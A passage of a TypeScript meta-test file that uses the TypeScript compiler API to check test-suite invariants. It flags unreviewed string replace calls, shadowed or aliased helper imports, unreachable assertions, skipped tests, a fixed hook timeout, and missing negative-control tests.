/** Reject raw replace-spelled method access except exact, live reviewed transforms. */
function repositoryMutationOracleProblems(filename: string, source: string): string[] {
  const { checker, sourceFile } = bindOracleSource(filename, source);
  const problems: string[] = [];
  const reviewedTransformCounts = new Map<ReviewedOrdinaryTransformId, number>();
  const methodResolver = computedMethodResolver(checker);
  const operationResolver = reflectiveOperationResolver(sourceFile, checker, methodResolver);
  const dynamicMethodTaint = dynamicComputedMethodTaintAnalysis(
    sourceFile,
    checker,
    methodResolver,
    operationResolver
  );

  function location(node: ts.Node): string {
    const position = sourceFile.getLineAndCharacterOfPosition(node.getStart(sourceFile));
    return `${position.line + 1}:${position.character + 1}`;
  }

  function visit(node: ts.Node): void {
    if (ts.isCallExpression(node)) {
      const reflectiveMethod = reflectiveReplaceMethod(node, operationResolver, methodResolver);
      if (reflectiveMethod !== null) {
        problems.push(`${filename}:${location(node)} reflectively acquires raw .${reflectiveMethod}`);
      }
    }
    if (
      ts.isCallExpression(node) &&
      isTaintedDynamicMethodInvocation(node, dynamicMethodTaint, methodResolver, operationResolver)
    ) {
      problems.push(
        `${filename}:${location(node)} invokes a value extracted from an unresolved dynamic computed method; ` +
          "replace/replaceAll cannot be excluded"
      );
    }
    if (
      ts.isTaggedTemplateExpression(node) &&
      isTaintedDynamicMethodTagInvocation(node, dynamicMethodTaint, methodResolver)
    ) {
      problems.push(
        `${filename}:${location(node)} invokes a value extracted from an unresolved dynamic computed method; ` +
          "replace/replaceAll cannot be excluded"
      );
    }
    if (ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node)) {
      const method = ts.isPropertyAccessExpression(node)
        ? staticPropertyText(node.name)
        : computedMethodText(node.argumentExpression, methodResolver);
      if ((method === "replace" || method === "replaceAll") && !isTypeOnlyAccess(node)) {
        const reviewedId = ts.isPropertyAccessExpression(node)
          ? reviewedOrdinaryTransformId(filename, node, sourceFile)
          : null;
        if (reviewedId !== null) {
          reviewedTransformCounts.set(reviewedId, (reviewedTransformCounts.get(reviewedId) ?? 0) + 1);
        } else {
          problems.push(`${filename}:${location(node)} has unclassified raw .${method} access`);
        }
      } else if (
        ts.isElementAccessExpression(node) &&
        method === null &&
        !isTypeOnlyAccess(node) &&
        isUnresolvedComputedMethod(node.argumentExpression, methodResolver) &&
        isDynamicComputedMethodUse(node)
      ) {
        problems.push(
          `${filename}:${location(node)} has unclassified dynamic computed method access; replace/replaceAll cannot be excluded`
        );
      }
    }
    if (ts.isBindingElement(node) && ts.isObjectBindingPattern(node.parent)) {
      const method =
        node.propertyName !== undefined && ts.isComputedPropertyName(node.propertyName)
          ? computedMethodText(node.propertyName.expression, methodResolver)
          : staticPropertyText(node.propertyName ?? node.name);
      if (method === "replace" || method === "replaceAll") {
        problems.push(`${filename}:${location(node)} has unclassified raw .${method} binding`);
      } else if (
        node.propertyName !== undefined &&
        ts.isComputedPropertyName(node.propertyName) &&
        method === null &&
        isUnresolvedComputedMethod(node.propertyName.expression, methodResolver)
      ) {
        problems.push(
          `${filename}:${location(node)} has unclassified dynamic computed binding; replace/replaceAll cannot be excluded`
        );
      }
    }
    if (
      (ts.isPropertyAssignment(node) || ts.isShorthandPropertyAssignment(node)) &&
      isDestructuringAssignmentProperty(node)
    ) {
      const method = ts.isComputedPropertyName(node.name)
        ? computedMethodText(node.name.expression, methodResolver)
        : staticPropertyText(node.name);
      if (method === "replace" || method === "replaceAll") {
        problems.push(`${filename}:${location(node)} has unclassified raw .${method} assignment binding`);
      } else if (
        ts.isComputedPropertyName(node.name) &&
        method === null &&
        isUnresolvedComputedMethod(node.name.expression, methodResolver)
      ) {
        problems.push(
          `${filename}:${location(node)} has unclassified dynamic computed assignment binding; replace/replaceAll cannot be excluded`
        );
      }
    }
    ts.forEachChild(node, visit);
  }

  visit(sourceFile);
  for (const reviewed of REVIEWED_ORDINARY_TRANSFORMS) {
    if (reviewed.filename === filename) {
      const actual = reviewedTransformCounts.get(reviewed.id) ?? 0;
      if (actual !== 1) {
        problems.push(`${filename} expected exactly one ${reviewed.id}, found ${actual}`);
      }
    }
  }
  return problems;
}

/** Count direct reviewed helper calls, optionally restricted to one exact call identity. */
function exactMutationHelperCallCount(
  filename: string,
  source: string,
  required?: ExactMutationHelperCallIdentity
): number {
  const sourceFile = ts.createSourceFile(filename, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  let count = 0;
  function visit(node: ts.Node): void {
    if (
      ts.isCallExpression(node) &&
      ts.isIdentifier(node.expression) &&
      EXACT_MUTATION_HELPERS.has(node.expression.text)
    ) {
      const sourceArgument = node.arguments[0];
      const needleArgument = node.arguments[1];
      const replacementArgument = node.arguments[2];
      if (
        required === undefined ||
        (node.expression.text === required.helper &&
          sourceArgument !== undefined &&
          ts.isIdentifier(sourceArgument) &&
          sourceArgument.text === required.sourceIdentifier &&
          needleArgument !== undefined &&
          ts.isStringLiteral(needleArgument) &&
          needleArgument.text === required.needle &&
          replacementArgument !== undefined &&
          ts.isStringLiteral(replacementArgument) &&
          replacementArgument.text === required.replacement)
      ) {
        count++;
      }
    }
    ts.forEachChild(node, visit);
  }
  visit(sourceFile);
  return count;
}

interface MutationHelperCallCensus {
  readonly count: number;
  readonly sha256: string;
}

/**
 * Freeze ordered helper-call sites and exact call AST text. Non-META files bind the complete
 * source, including Vitest consumers/imports; META binds its complete top-level suite statement
 * to avoid a digest-carrier self-cycle while the sibling timeout oracle pins its suite/hook import.
 */
function exactMutationHelperCallCensus(filename: string, source: string): MutationHelperCallCensus {
  const sourceFile = ts.createSourceFile(filename, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  const records: Array<{
    readonly call: string;
    readonly callStart: number;
    readonly owner: string;
    readonly ownerSha256: string;
  }> = [];

  function visit(node: ts.Node): void {
    if (
      ts.isCallExpression(node) &&
      ts.isIdentifier(node.expression) &&
      EXACT_MUTATION_HELPERS.has(node.expression.text)
    ) {
      const owner = mutationHelperCallOwner(node);
      const topLevelOwner = topLevelExecutableOwner(node, sourceFile);
      const authorityOwner = filename === "meta-invariant-coverage.test.ts" ? topLevelOwner : sourceFile;
      records.push({
        call: node.getText(sourceFile),
        callStart: node.getStart(sourceFile),
        owner: owner.id,
        ownerSha256: sourceOwnerSha256(owner.id, authorityOwner, sourceFile)
      });
    }
    ts.forEachChild(node, visit);
  }

  visit(sourceFile);
  return { count: records.length, sha256: sha256Text(JSON.stringify(records)) };
}

/** True only when an identifier creates a runtime binding that can shadow an imported helper. */
function isValueBindingIdentifier(node: ts.Identifier): boolean {
  const parent = node.parent;
  return (
    ((ts.isVariableDeclaration(parent) ||
      ts.isParameter(parent) ||
      ts.isFunctionDeclaration(parent) ||
      ts.isFunctionExpression(parent) ||
      ts.isClassDeclaration(parent) ||
      ts.isClassExpression(parent) ||
      ts.isEnumDeclaration(parent) ||
      ts.isModuleDeclaration(parent) ||
      ts.isImportClause(parent) ||
      ts.isImportSpecifier(parent) ||
      ts.isNamespaceImport(parent) ||
      ts.isImportEqualsDeclaration(parent)) &&
      parent.name === node) ||
    (ts.isBindingElement(parent) && parent.name === node)
  );
}

/** Whether one source imports the shared exact-mutation module at runtime. */
function importsExactMutationHelperModule(filename: string, source: string): boolean {
  const sourceFile = ts.createSourceFile(filename, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  return sourceFile.statements.some(
    (statement) =>
      ts.isImportDeclaration(statement) &&
      statement.importClause !== undefined &&
      !statement.importClause.isTypeOnly &&
      ts.isStringLiteral(statement.moduleSpecifier) &&
      statement.moduleSpecifier.text === "./helpers/exact-source-mutation.js"
  );
}

/** Require direct, unaliased helper imports and reject every local binding that can shadow them. */
function exactMutationHelperBindingProblems(filename: string, source: string): string[] {
  const expectedImports = EXPECTED_REPOSITORY_MUTATION_HELPER_IMPORTS.get(filename);
  if (expectedImports === undefined) return [];

  const sourceFile = ts.createSourceFile(filename, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  const problems: string[] = [];
  const approvedImportIdentifiers = new Set<ts.Identifier>();
  const actualImports: string[] = [];
  const helperImports = sourceFile.statements.filter(
    (statement): statement is ts.ImportDeclaration =>
      ts.isImportDeclaration(statement) &&
      ts.isStringLiteral(statement.moduleSpecifier) &&
      statement.moduleSpecifier.text === "./helpers/exact-source-mutation.js"
  );

  if (helperImports.length !== 1) {
    problems.push(
      `${filename} expected exactly one exact-source-mutation helper import, found ${helperImports.length}`
    );
  }
  const importClause = helperImports[0]?.importClause;
  if (
    importClause === undefined ||
    importClause.isTypeOnly ||
    importClause.name !== undefined ||
    importClause.namedBindings === undefined ||
    !ts.isNamedImports(importClause.namedBindings)
  ) {
    problems.push(`${filename} exact-source-mutation helpers must use one named import`);
  } else {
    for (const element of importClause.namedBindings.elements) {
      const importedName = element.propertyName?.text ?? element.name.text;
      const localName = element.name.text;
      if (element.isTypeOnly) {
        problems.push(`${filename} imports exact mutation helper ${importedName} as type-only`);
        continue;
      }
      if (importedName !== localName) {
        problems.push(`${filename} aliases exact mutation helper ${importedName} as ${localName}`);
        continue;
      }
      actualImports.push(localName);
      approvedImportIdentifiers.add(element.name);
    }
  }

  const expected = [...expectedImports].sort();
  const actual = actualImports.sort();
  if (actual.join("\0") !== expected.join("\0")) {
    problems.push(`${filename} expected exact helper imports ${expected.join(", ")}, found ${actual.join(", ")}`);
  }

  function visit(node: ts.Node): void {
    if (
      ts.isIdentifier(node) &&
      EXACT_MUTATION_HELPERS.has(node.text) &&
      isValueBindingIdentifier(node) &&
      !approvedImportIdentifiers.has(node)
    ) {
      const position = sourceFile.getLineAndCharacterOfPosition(node.getStart(sourceFile));
      problems.push(
        `${filename}:${position.line + 1}:${position.character + 1} shadows exact mutation helper ${node.text}`
      );
    }
    ts.forEachChild(node, visit);
  }
  visit(sourceFile);
  return problems;
}

/** Discover all structural-invariant test files: every `*-invariant.test.ts`
 *  (recursive) plus the curated EXTRA_STRUCTURAL_FILES. */
async function collectInvariantTestFiles(): Promise<string[]> {
  const testsRoot = path.join(repoRoot, "tests");
  const present = new Set<string>();
  async function walk(dir: string) {
    const entries = await fs.readdir(dir, { withFileTypes: true });
    for (const e of entries) {
      const full = path.join(dir, e.name);
      if (e.isDirectory()) await walk(full);
      else if (e.name.endsWith("-invariant.test.ts")) {
        present.add(path.relative(testsRoot, full).split(path.sep).join("/"));
      }
    }
  }
  await walk(testsRoot);
  for (const name of EXTRA_STRUCTURAL_FILES) {
    const full = path.join(testsRoot, name);
    try {
      await fs.access(full);
      present.add(name);
    } catch {
      // Exact membership below aggregates missing and unexpected paths.
    }
  }
  assertStructuralFileMembership(present);
  return [...present].sort().map((name) => path.join(testsRoot, name));
}

/** Whether an expression is `expect(...)`, `expect.soft(...)`, or `expect.poll(...)`. */
function isExpectInvocation(node: ts.Expression): boolean {
  if (!ts.isCallExpression(node)) return false;
  if (ts.isIdentifier(node.expression)) return node.expression.text === "expect";
  return (
    ts.isPropertyAccessExpression(node.expression) &&
    ts.isIdentifier(node.expression.expression) &&
    node.expression.expression.text === "expect" &&
    (node.expression.name.text === "soft" || node.expression.name.text === "poll")
  );
}

/** A matcher call must be rooted in `expect(...)`; a bare `expect(value)` is vacuous. */
function isExpectMatcherCall(node: ts.CallExpression): boolean {
  if (!ts.isPropertyAccessExpression(node.expression)) return false;
  let target: ts.Expression = node.expression.expression;
  while (
    ts.isPropertyAccessExpression(target) &&
    (target.name.text === "not" || target.name.text === "resolves" || target.name.text === "rejects")
  ) {
    target = target.expression;
  }
  return isExpectInvocation(target);
}

/** Whether an argument is a positive integer literal accepted by `expect.assertions`. */
function isPositiveIntegerLiteral(node: ts.Expression | undefined): boolean {
  if (node === undefined || !ts.isNumericLiteral(node)) return false;
  const value = Number(node.text);
  return Number.isInteger(value) && value > 0;
}

/** Return true only for executable matcher/assertion calls. */
function isAssertionCall(node: ts.Node): boolean {
  if (!ts.isCallExpression(node)) return false;
  const callee = node.expression;
  if (ts.isIdentifier(callee)) return callee.text === "assert";
  if (!ts.isPropertyAccessExpression(callee)) return false;
  if (ts.isIdentifier(callee.expression) && callee.expression.text === "assert") return true;
  if (ts.isIdentifier(callee.expression) && callee.expression.text === "expect") {
    if (callee.name.text === "fail") return true;
    if (callee.name.text === "hasAssertions") return node.arguments.length === 0;
    if (callee.name.text === "assertions") {
      return node.arguments.length === 1 && isPositiveIntegerLiteral(node.arguments[0]);
    }
  }
  return isExpectMatcherCall(node);
}

/** Match the literal booleans used by the deliberately small reachability guard. */
function isLiteralBoolean(node: ts.Expression, value: boolean): boolean {
  let current = node;
  while (
    ts.isParenthesizedExpression(current) ||
    ts.isAsExpression(current) ||
    ts.isTypeAssertionExpression(current) ||
    ts.isNonNullExpression(current) ||
    ts.isSatisfiesExpression(current)
  ) {
    current = current.expression;
  }
  return current.kind === (value ? ts.SyntaxKind.TrueKeyword : ts.SyntaxKind.FalseKeyword);
}

interface CallbackSkipBindings {
  bareNames: ReadonlySet<string>;
  receiverNames: ReadonlySet<string>;
}

/** Derive only the current test callback's syntactic context/skip bindings. */
function callbackSkipBindings(callback: ts.ArrowFunction | ts.FunctionExpression): CallbackSkipBindings {
  const receiverNames = new Set<string>();
  const bareNames = new Set<string>();
  const parameter = callback.parameters[0];
  if (parameter === undefined) return { bareNames, receiverNames };
  if (ts.isIdentifier(parameter.name)) {
    receiverNames.add(parameter.name.text);
  } else if (ts.isObjectBindingPattern(parameter.name)) {
    for (const element of parameter.name.elements) {
      if (!ts.isIdentifier(element.name)) continue;
      const propertyName = element.propertyName;
      let sourceName = element.name.text;
      if (propertyName !== undefined && (ts.isIdentifier(propertyName) || ts.isStringLiteralLike(propertyName))) {
        sourceName = propertyName.text;
      } else if (
        propertyName !== undefined &&
        ts.isComputedPropertyName(propertyName) &&
        ts.isStringLiteralLike(propertyName.expression)
      ) {
        sourceName = propertyName.expression.text;
      }
      if (sourceName === "skip") bareNames.add(element.name.text);
    }
  }
  return { bareNames, receiverNames };
}

/** Recognize `ctx.skip()` or a destructured `skip()` from this callback only. */
function isCallbackSkipCall(node: ts.Node, bindings: CallbackSkipBindings): boolean {
  if (!ts.isCallExpression(node)) return false;
  const callee = node.expression;
  return (
    (ts.isIdentifier(callee) && bindings.bareNames.has(callee.text)) ||
    (ts.isPropertyAccessExpression(callee) &&
      callee.name.text === "skip" &&
      ts.isIdentifier(callee.expression) &&
      bindings.receiverNames.has(callee.expression.text)) ||
    (ts.isElementAccessExpression(callee) &&
      ts.isIdentifier(callee.expression) &&
      bindings.receiverNames.has(callee.expression.text) &&
      callee.argumentExpression !== undefined &&
      ts.isStringLiteralLike(callee.argumentExpression) &&
      callee.argumentExpression.text === "skip")
  );
}

/** Recognize an unconditional Vitest-style skip statement before an assertion. */
function isCallbackSkipStatement(statement: ts.Statement, bindings: CallbackSkipBindings): boolean {
  if (!ts.isExpressionStatement(statement)) return false;
  let expression = statement.expression;
  while (
    ts.isParenthesizedExpression(expression) ||
    ts.isAwaitExpression(expression) ||
    ts.isVoidExpression(expression)
  ) {
    expression = expression.expression;
  }
  return isCallbackSkipCall(expression, bindings);
}

/** Recognize only obvious unconditional exits; this is not intended to be a full CFG. */
function statementObviouslyTerminates(
  statement: ts.Statement,
  extraTerminator?: (candidate: ts.Statement) => boolean
): boolean {
  if (ts.isReturnStatement(statement) || ts.isThrowStatement(statement) || extraTerminator?.(statement) === true)
    return true;
  if (ts.isBlock(statement)) {
    return statement.statements.some((nested) => statementObviouslyTerminates(nested, extraTerminator));
  }
  if (ts.isIfStatement(statement)) {
    if (isLiteralBoolean(statement.expression, true)) {
      return statementObviouslyTerminates(statement.thenStatement, extraTerminator);
    }
    if (isLiteralBoolean(statement.expression, false)) {
      return (
        statement.elseStatement !== undefined && statementObviouslyTerminates(statement.elseStatement, extraTerminator)
      );
    }
    return (
      statement.elseStatement !== undefined &&
      statementObviouslyTerminates(statement.thenStatement, extraTerminator) &&
      statementObviouslyTerminates(statement.elseStatement, extraTerminator)
    );
  }
  return false;
}

/** Find assertions reachable under the small, explicit guards above. */
function nodeHasReachableAssertion(node: ts.Node, skipBindings?: CallbackSkipBindings): boolean {
  if (isAssertionCall(node)) return true;
  if (ts.isFunctionLike(node)) return false;
  if (ts.isBlock(node)) {
    for (const statement of node.statements) {
      if (nodeHasReachableAssertion(statement, skipBindings)) return true;
      if (
        statementObviouslyTerminates(
          statement,
          skipBindings === undefined ? undefined : (candidate) => isCallbackSkipStatement(candidate, skipBindings)
        )
      ) {
        break;
      }
    }
    return false;
  }
  if (ts.isIfStatement(node)) {
    if (nodeHasReachableAssertion(node.expression, skipBindings)) return true;
    if (isLiteralBoolean(node.expression, false)) {
      return node.elseStatement !== undefined && nodeHasReachableAssertion(node.elseStatement, skipBindings);
    }
    if (isLiteralBoolean(node.expression, true)) return nodeHasReachableAssertion(node.thenStatement, skipBindings);
    return (
      nodeHasReachableAssertion(node.thenStatement, skipBindings) ||
      (node.elseStatement !== undefined && nodeHasReachableAssertion(node.elseStatement, skipBindings))
    );
  }
  if (ts.isBinaryExpression(node)) {
    if (nodeHasReachableAssertion(node.left, skipBindings)) return true;
    if (node.operatorToken.kind === ts.SyntaxKind.AmpersandAmpersandToken && isLiteralBoolean(node.left, false)) {
      return false;
    }
    if (node.operatorToken.kind === ts.SyntaxKind.BarBarToken && isLiteralBoolean(node.left, true)) return false;
    return nodeHasReachableAssertion(node.right, skipBindings);
  }
  if (ts.isConditionalExpression(node)) {
    if (nodeHasReachableAssertion(node.condition, skipBindings)) return true;
    if (isLiteralBoolean(node.condition, true)) return nodeHasReachableAssertion(node.whenTrue, skipBindings);
    if (isLiteralBoolean(node.condition, false)) return nodeHasReachableAssertion(node.whenFalse, skipBindings);
    return (
      nodeHasReachableAssertion(node.whenTrue, skipBindings) || nodeHasReachableAssertion(node.whenFalse, skipBindings)
    );
  }
  if (ts.isWhileStatement(node) && isLiteralBoolean(node.expression, false)) {
    return nodeHasReachableAssertion(node.expression, skipBindings);
  }
  if (ts.isForStatement(node) && node.condition !== undefined && isLiteralBoolean(node.condition, false)) {
    return (
      (node.initializer !== undefined && nodeHasReachableAssertion(node.initializer, skipBindings)) ||
      nodeHasReachableAssertion(node.condition, skipBindings)
    );
  }

  let found = false;
  ts.forEachChild(node, (child) => {
    if (!found && nodeHasReachableAssertion(child, skipBindings)) found = true;
  });
  return found;
}

/** Inspect one test callback without borrowing assertions from nested functions. */
function testCallbackHasAssertion(callback: ts.ArrowFunction | ts.FunctionExpression): boolean {
  return nodeHasReachableAssertion(callback.body, callbackSkipBindings(callback));
}

type RegistrationName = "it" | "test" | "describe";

/** Return a supported direct registration name; wrappers such as `it.each` fail closed. */
function registrationName(call: ts.CallExpression): RegistrationName | null {
  if (!ts.isIdentifier(call.expression)) return null;
  const name = call.expression.text;
  return name === "it" || name === "test" || name === "describe" ? name : null;
}

/** True only for the obvious Vitest options bypass `{ skip: true }`. */
function hasLiteralSkipTrue(node: ts.Expression): boolean {
  if (!ts.isObjectLiteralExpression(node)) return false;
  return node.properties.some((property) => {
    if (!ts.isPropertyAssignment(property)) return false;
    const name = property.name;
    const isSkip =
      ((ts.isIdentifier(name) || ts.isStringLiteralLike(name)) && name.text === "skip") ||
      (ts.isComputedPropertyName(name) && ts.isStringLiteralLike(name.expression) && name.expression.text === "skip");
    return isSkip && isLiteralBoolean(property.initializer, true);
  });
}

/** Find a registration callback unless an earlier options object explicitly skips it. */
function registrationCallback(call: ts.CallExpression): ts.ArrowFunction | ts.FunctionExpression | undefined {
  for (let index = 1; index < call.arguments.length; index++) {
    const argument = call.arguments[index];
    if (argument === undefined) continue;
    if (ts.isArrowFunction(argument) || ts.isFunctionExpression(argument)) {
      if (call.arguments.slice(1, index).some((option) => hasLiteralSkipTrue(option))) return undefined;
      return argument;
    }
  }
  return undefined;
}

/** Return supported registrations from a direct statement list. */
function registrationsInStatements(statements: readonly ts.Statement[]): ts.CallExpression[] {
  const registrations: ts.CallExpression[] = [];
  for (const statement of statements) {
    if (
      ts.isExpressionStatement(statement) &&
      ts.isCallExpression(statement.expression) &&
      registrationName(statement.expression) !== null
    ) {
      registrations.push(statement.expression);
    }
    if (statementObviouslyTerminates(statement)) break;
  }
  return registrations;
}

/** Return registrations that are direct statements in one source/describe body. */
function directRegistrations(body: ts.SourceFile | ts.ArrowFunction | ts.FunctionExpression): ts.CallExpression[] {
  if (ts.isSourceFile(body)) return registrationsInStatements(body.statements);
  if (ts.isBlock(body.body)) return registrationsInStatements(body.body.statements);
  if (ts.isCallExpression(body.body) && registrationName(body.body) !== null) {
    return [body.body];
  }
  return [];
}

type FocusTimeoutVitestBinding = "beforeAll" | "describe";

const FOCUS_TIMEOUT_FILENAME = "tests/no-internal-imports.test.ts";
const FOCUS_TIMEOUT_SUITE_TITLE = "Class A invariant — no test imports value from registration boilerplate";
const FOCUS_TIMEOUT_SUITE_PROBLEM = `${FOCUS_TIMEOUT_FILENAME} must retain one direct top-level suite ${FOCUS_TIMEOUT_SUITE_TITLE}`;
const FOCUS_TIMEOUT_REGISTRATION_PROBLEM = `${FOCUS_TIMEOUT_FILENAME} must retain one first direct beforeAll hook with exact timeout 45_000`;

/** Require the exact Vitest bindings that give the timeout registration authority. */
function focusTimeoutVitestBindingProblems(sourceFile: ts.SourceFile): string[] {
  const requiredBindings: readonly FocusTimeoutVitestBinding[] = ["beforeAll", "describe"];
  const directCounts = new Map<FocusTimeoutVitestBinding, number>();
  const competingCounts = new Map<FocusTimeoutVitestBinding, number>();
  for (const binding of requiredBindings) {
    directCounts.set(binding, 0);
    competingCounts.set(binding, 0);
  }

  const recordCompetingBinding = (name: ts.BindingName): void => {
    if (ts.isIdentifier(name)) {
      const binding = requiredBindings.find((candidate) => candidate === name.text);
      if (binding !== undefined) {
        competingCounts.set(binding, (competingCounts.get(binding) ?? 0) + 1);
      }
      return;
    }
    for (const element of name.elements) {
      if (ts.isBindingElement(element)) recordCompetingBinding(element.name);
    }
  };

  const visitRuntimeBindings = (node: ts.Node): void => {
    if (ts.isImportDeclaration(node)) {
      const clause = node.importClause;
      if (clause === undefined || clause.isTypeOnly) return;
      if (clause.name !== undefined) recordCompetingBinding(clause.name);
      const bindings = clause.namedBindings;
      if (bindings === undefined) return;
      if (ts.isNamespaceImport(bindings)) {
        recordCompetingBinding(bindings.name);
        return;
      }
      const isVitestImport = ts.isStringLiteral(node.moduleSpecifier) && node.moduleSpecifier.text === "vitest";
      for (const element of bindings.elements) {
        if (element.isTypeOnly) continue;
        const binding = requiredBindings.find((candidate) => candidate === element.name.text);
        if (isVitestImport && element.propertyName === undefined && binding !== undefined) {
          directCounts.set(binding, (directCounts.get(binding) ?? 0) + 1);
        } else {
          recordCompetingBinding(element.name);
        }
      }
      return;
    }
    if (ts.isImportEqualsDeclaration(node)) {
      if (!node.isTypeOnly) recordCompetingBinding(node.name);
      return;
    }
    if (ts.isVariableDeclaration(node) || ts.isParameter(node)) {
      recordCompetingBinding(node.name);
    } else if (
      ts.isFunctionDeclaration(node) ||
      ts.isFunctionExpression(node) ||
      ts.isClassDeclaration(node) ||
      ts.isClassExpression(node) ||
      ts.isEnumDeclaration(node)
    ) {
      if (node.name !== undefined) recordCompetingBinding(node.name);
    } else if (ts.isModuleDeclaration(node) && ts.isIdentifier(node.name)) {
      recordCompetingBinding(node.name);
    }
    ts.forEachChild(node, visitRuntimeBindings);
  };
  visitRuntimeBindings(sourceFile);

  return requiredBindings.flatMap((binding) => {
    const direct = directCounts.get(binding) ?? 0;
    const competing = competingCounts.get(binding) ?? 0;
    return direct === 1 && competing === 0
      ? []
      : [
          `${FOCUS_TIMEOUT_FILENAME} must bind ${binding} through one direct unaliased runtime vitest named import ` +
            `and no competing runtime bindings; found direct ${direct}, competing ${competing}`
        ];
  });
}

/** Independently pin the reachable 45-second focus-census and OIA-wiring hook. */
function focusTimeoutRegistrationProblems(source: string): string[] {
  const sourceFile = ts.createSourceFile(
    FOCUS_TIMEOUT_FILENAME,
    source,
    ts.ScriptTarget.Latest,
    true,
    ts.ScriptKind.TS
  );
  const internalSourceFile = sourceFile as ts.SourceFile & {
    readonly parseDiagnostics?: readonly ts.Diagnostic[];
  };
  const parseDiagnostic = internalSourceFile.parseDiagnostics?.[0];
  if (parseDiagnostic !== undefined) {
    return [`${FOCUS_TIMEOUT_FILENAME} must remain parseable (TS${parseDiagnostic.code})`];
  }

  const bindingProblems = focusTimeoutVitestBindingProblems(sourceFile);
  const suites = sourceFile.statements.flatMap((statement) => {
    if (!ts.isExpressionStatement(statement) || !ts.isCallExpression(statement.expression)) return [];
    const call = statement.expression;
    const title = call.arguments[0];
    if (
      !ts.isIdentifier(call.expression) ||
      call.expression.text !== "describe" ||
      title === undefined ||
      !ts.isStringLiteral(title) ||
      title.text !== FOCUS_TIMEOUT_SUITE_TITLE
    ) {
      return [];
    }
    return [call];
  });
  const suite = suites.length === 1 ? suites[0] : undefined;
  const suiteCallback = suite?.arguments[1];
  if (
    suite === undefined ||
    suite.questionDotToken !== undefined ||
    suite.typeArguments !== undefined ||
    suite.arguments.length !== 2 ||
    suiteCallback === undefined ||
    !ts.isArrowFunction(suiteCallback) ||
    suiteCallback.modifiers?.some((modifier) => modifier.kind === ts.SyntaxKind.AsyncKeyword) === true ||
    suiteCallback.typeParameters !== undefined ||
    suiteCallback.parameters.length !== 0 ||
    !ts.isBlock(suiteCallback.body)
  ) {
    return [...bindingProblems, FOCUS_TIMEOUT_SUITE_PROBLEM];
  }

  const registrations = suiteCallback.body.statements.flatMap((statement, statementIndex) => {
    if (!ts.isExpressionStatement(statement) || !ts.isCallExpression(statement.expression)) return [];
    const call = statement.expression;
    if (!ts.isIdentifier(call.expression) || call.expression.text !== "beforeAll") return [];
    return [{ call, statementIndex }];
  });
  const registrationEntry = registrations.length === 1 ? registrations[0] : undefined;
  const registration = registrationEntry?.call;
  const callback = registration?.arguments[0];
  const timeout = registration?.arguments[1];
  const callbackModifiers = callback !== undefined && ts.isArrowFunction(callback) ? callback.modifiers : undefined;
  const registrationIsExact =
    registration !== undefined &&
    registrationEntry?.statementIndex === 0 &&
    registration.questionDotToken === undefined &&
    registration.typeArguments === undefined &&
    registration.arguments.length === 2 &&
    callback !== undefined &&
    ts.isArrowFunction(callback) &&
    callbackModifiers?.length === 1 &&
    callbackModifiers[0]?.kind === ts.SyntaxKind.AsyncKeyword &&
    callback.typeParameters === undefined &&
    callback.parameters.length === 0 &&
    ts.isBlock(callback.body) &&
    timeout !== undefined &&
    ts.isNumericLiteral(timeout) &&
    timeout.getText(sourceFile) === "45_000";
  return registrationIsExact ? bindingProblems : [...bindingProblems, FOCUS_TIMEOUT_REGISTRATION_PROBLEM];
}

/** A negative `describe` owns assertions only through direct nested registrations. */
function describeCallbackHasAssertion(callback: ts.ArrowFunction | ts.FunctionExpression): boolean {
  return directRegistrations(callback).some((call) => {
    const name = registrationName(call);
    const nestedCallback = registrationCallback(call);
    if (name === null || nestedCallback === undefined) return false;
    return name === "describe"
      ? describeCallbackHasAssertion(nestedCallback)
      : testCallbackHasAssertion(nestedCallback);
  });
}

/** Match a standalone title token rather than a substring such as `NONNEGATIVE`. */
function hasNegativeControlTitle(title: string): boolean {
  for (const match of title.matchAll(/NEGATIVE|negative[-_]control/gu)) {
    const start = match.index;
    const matched = match[0];
    if (start === undefined || matched === undefined) continue;
    const before = [...title.slice(0, start)].at(-1);
    const after = [...title.slice(start + matched.length)][0];
    if (before !== undefined && /[\p{L}\p{N}_]/u.test(before)) continue;
    if (after !== undefined && /[\p{L}\p{N}_]/u.test(after)) continue;
    if (title.slice(0, start).toLowerCase().endsWith("non-")) continue;
    return true;
  }
  return false;
}

/** Search a direct registration tree for a literal-titled NEGATIVE control. */
function registrationTreeHasNegativeControl(call: ts.CallExpression): boolean {
  const name = registrationName(call);
  const callback = registrationCallback(call);
  if (name === null || callback === undefined) return false;

  const title = call.arguments[0];
  if (
    title !== undefined &&
    ts.isStringLiteralLike(title) &&
    hasNegativeControlTitle(title.text) &&
    (name === "describe" ? describeCallbackHasAssertion(callback) : testCallbackHasAssertion(callback))
  ) {
    return true;
  }
  return name === "describe" && directRegistrations(callback).some(registrationTreeHasNegativeControl);
}

/** Only registered top-level/direct-describe tests can provide coverage. */
function sourceHasNegativeControl(filename: string, content: string): boolean {
  const sourceFile = ts.createSourceFile(filename, content, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  return directRegistrations(sourceFile).some(registrationTreeHasNegativeControl);
}

/** Accept only a standalone, non-empty single-line exemption comment in lines 1–50. */
function hasHeaderExemption(filename: string, content: string): boolean {
  const sourceFile = ts.createSourceFile(filename, content, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  const lineStarts = sourceFile.getLineStarts();
  const scanner = ts.createScanner(ts.ScriptTarget.Latest, false, ts.LanguageVariant.Standard, content);
  for (let token = scanner.scan(); token !== ts.SyntaxKind.EndOfFileToken; token = scanner.scan()) {
    const tokenPosition = scanner.getTokenPos();
    const { line } = sourceFile.getLineAndCharacterOfPosition(tokenPosition);
    if (line >= 50) break;
    if (token !== ts.SyntaxKind.SingleLineCommentTrivia) continue;

    const lineStart = lineStarts[line] ?? 0;
    if (content.slice(lineStart, tokenPosition).trim() !== "") continue;
    if (/^\/\/\s*META-INVARIANT-EXEMPT:\s*\S.*$/.test(scanner.getTokenText())) return true;
  }
  return false;
}

/** Pure check: invariant file has NEGATIVE coverage OR a reviewed exemption. */
function checkInvariantHasNegativeCoverage(filename: string, content: string): string | null {
  // Path (a): an INLINE negative-control TEST — the token inside an
  // it()/test()/describe() title, whose CALLBACK BODY actually asserts. Repo
  // convention is mixed-case ("NEGATIVE" / "negative-control"); accept both.
  // Parse declarations structurally so a callback cannot be vacuous, borrow a
